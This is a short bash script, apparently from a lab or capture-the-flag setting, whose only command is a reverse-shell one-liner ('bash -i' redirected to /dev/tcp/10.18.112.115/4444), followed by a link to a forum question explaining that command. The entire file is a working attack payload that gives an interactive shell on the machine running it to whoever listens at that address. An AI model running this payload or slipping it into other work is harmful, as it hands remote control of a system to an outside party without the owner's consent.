#!/bin/bash
bash -i >& /dev/tcp/10.18.112.115/4444 0>&1

# References
# [Meaning of the command](https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01)
